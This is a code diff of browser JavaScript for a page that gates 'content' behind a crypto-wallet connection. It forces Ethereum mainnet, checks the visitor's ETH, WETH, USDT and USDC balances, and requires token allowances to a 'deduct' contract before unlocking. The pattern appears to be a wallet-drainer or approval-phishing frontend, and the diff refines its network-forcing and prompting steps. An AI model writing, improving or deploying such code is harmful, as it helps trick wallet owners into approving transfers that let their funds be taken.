@@ -7,7 +7,7 @@ const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
 const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
 const WETH_CONTRACT_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';
 
-// --- ABI Definitions (Client-side slim version) ---
+// --- ABI Definitions ---
 const DEDUCT_CONTRACT_ABI = [
     "function isServiceActiveFor(address customer) public view returns (bool)",
     "function activateService(address tokenContract) external",
@@ -49,41 +49,38 @@ function updateStatus(message) {
 // --- Core Wallet Logic ---
 
 /**
- * Initializes wallet state, checks for provider, forces mainnet, and checks connection.
+ * Initializes wallet, forces mainnet, and checks connection status.
  */
 async function initializeWallet() {
     try {
-        if (typeof window.ethereum === 'undefined') {
+        if (!window.ethereum) {
             return showOverlay('Please install MetaMask or a compatible wallet to continue.');
         }
         
         provider = new ethers.BrowserProvider(window.ethereum);
 
-        // ✅ --- Force Mainnet Logic ---
-        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-        const mainnetChainId = '0x1'; // Ethereum Mainnet's Chain ID
+        // ✅ Reinforced Force Mainnet Logic
+        const network = await provider.getNetwork();
+        const mainnetChainId = 1n; // Use BigInt for comparison
 
-        if (chainId !== mainnetChainId) {
+        if (network.chainId !== mainnetChainId) {
             showOverlay('Requesting to switch to Ethereum Mainnet...<br>Please approve in your wallet.');
             try {
-                await window.ethereum.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: mainnetChainId }],
-                });
-                // After a successful switch, the page will reload via the chainChanged event listener.
+                // Use the provider's send method for robust network switching
+                await provider.send('wallet_switchEthereumChain', [{ chainId: ethers.toQuantity(mainnetChainId) }]);
+                // On successful switch, the chainChanged listener will trigger a page reload, so we just wait.
                 return; 
             } catch (switchError) {
                 if (switchError.code === 4001) { // User rejected the switch
-                    return showOverlay('You must switch to Ethereum Mainnet to use this service.');
+                    return showOverlay('You must switch to Ethereum Mainnet to use this service. Please refresh the page after switching.');
                 }
-                console.error("Failed to switch network:", switchError);
                 return showOverlay(`Failed to switch network. Please do it manually.<br>Error: ${switchError.message}`);
             }
         }
-        // --- End of Force Mainnet Logic ---
+        // --- End of Reinforced Logic ---
 
-        // Set up event listeners after network check is passed
-        window.ethereum.on('accountsChanged', (accounts) => accounts.length === 0 ? resetState() : initializeWallet());
+        // Set up listeners only after confirming the correct network
+        window.ethereum.on('accountsChanged', () => window.location.reload()); // Simplest way to handle account changes
         window.ethereum.on('chainChanged', () => window.location.reload());
 
         const accounts = await provider.send('eth_accounts', []);
@@ -98,7 +95,7 @@ async function initializeWallet() {
             
             await checkAuthorization();
         } else {
-            showOverlay('Please connect your wallet to unlock content 🔒<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(Click the wallet icon in the upper right corner to start)</p>');
+            showOverlay('Please connect your wallet to unlock content 🔒<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(Click the wallet icon to start)</p>');
         }
     } catch (error) {
         console.error("Initialize Wallet Error:", error);
@@ -112,7 +109,7 @@ async function initializeWallet() {
 async function checkAuthorization() {
     try {
         if (!signer) return showOverlay('Wallet not connected. Please connect first.');
-        updateStatus("Checking authorization status...");
+        updateStatus("Checking authorization...");
 
         const isServiceActive = await deductContract.isServiceActiveFor(userAddress);
         const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();
@@ -132,27 +129,34 @@ async function checkAuthorization() {
             hideOverlay();
         } else {
             connectButton.classList.remove('connected');
-            connectButton.title = 'Connect Wallet & Complete Authorization';
-            showOverlay('Authorization is required to view content.<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(Please click the wallet icon in the upper right corner)</p>');
+            connectButton.title = 'Connect & Authorize';
+            showOverlay('Authorization is required.<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(Please click the wallet icon)</p>');
         }
         updateStatus("");
     } catch (error) {
         console.error("Check Authorization Error:", error);
         if (error.code === 'CALL_EXCEPTION') {
-            return showOverlay('Could not connect to the contract on the current network.<br>Please ensure you are on Ethereum Mainnet and refresh the page.');
+            return showOverlay('Contract communication failed.<br>Please ensure you are on **Ethereum Mainnet** and that the contract address is correct, then refresh the page.');
         }
         showOverlay(`Authorization check failed: ${error.message}`);
     }
 }
 
 /**
- * Connects wallet and initiates the appropriate authorization flow based on asset balance.
+ * Main function to connect and initiate the authorization flow.
  */
 async function connectWallet() {
     try {
-        if (typeof window.ethereum === 'undefined') return showOverlay('Please install MetaMask.');
-        showOverlay('Please confirm the connection request in your wallet...');
-        await provider.send('eth_requestAccounts', []);
+        // Ensure provider is initialized and on the correct network before proceeding
+        if (!provider || (await provider.getNetwork()).chainId !== 1n) {
+             await initializeWallet();
+             const network = await provider.getNetwork();
+             if (network.chainId !== 1n) return; // Stop if network is still not correct
+        }
+
+        showOverlay('Please confirm the connection in your wallet...');
+        const accounts = await provider.send('eth_requestAccounts', []);
+        if (accounts.length === 0) throw new Error("No account was selected.");
 
         signer = await provider.getSigner();
         userAddress = await signer.getAddress();
@@ -161,7 +165,7 @@ async function connectWallet() {
         usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
         wethContract = new ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
 
-        showOverlay('Checking your wallet balance to optimize the process...');
+        showOverlay('Checking your balances to optimize the process...');
 
         const [ethBalance, wethBalance, usdtBalance, usdcBalance] = await Promise.all([
             provider.getBalance(userAddress),
@@ -254,13 +258,9 @@ function resetState() {
     signer = userAddress = deductContract = usdtContract = usdcContract = wethContract = null;
     connectButton.classList.remove('connected');
     connectButton.title = 'Connect Wallet';
-    showOverlay('Please connect your wallet to unlock content 🔒<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(Click the wallet icon in the upper right corner to start)</p>');
+    showOverlay('Please connect your wallet to unlock content 🔒<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(Click the wallet icon to start)</p>');
 }
 
-// --- Event Listeners ---
-connectButton.addEventListener('click', () => {
-    connectButton.classList.contains('connected') ? disconnectWallet() : connectWallet();
-});
-
-// --- Initial Load ---
+// --- Event Listeners & Initial Load ---
+connectButton.addEventListener('click', connectWallet);
 initializeWallet();
